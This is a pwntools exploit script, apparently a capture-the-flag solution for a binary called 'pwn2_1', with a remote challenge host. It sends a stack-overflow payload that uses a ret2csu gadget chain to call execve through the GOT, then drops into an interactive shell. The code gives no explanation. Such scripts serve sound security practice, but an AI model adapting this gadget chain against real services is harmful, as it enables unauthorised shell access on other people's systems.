from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["gxh191.top",25531]
#libc=ELF('')
elf = ELF('./pwn2_1')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn2_1")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

execve_got = p64(elf.got['execve'])
csuaddr = p64(0x40134a)
csuaddr2 = p64(0x401330)

#gdb.attach(p)
ru(b';)\n')
payload = p64(0) + p64(0) + b'a' * 8 + csuaddr + p64(0) + p64(1) + p64(0x402008) + p64(0) + p64(0) + execve_got + csuaddr2
s(payload)

shell()
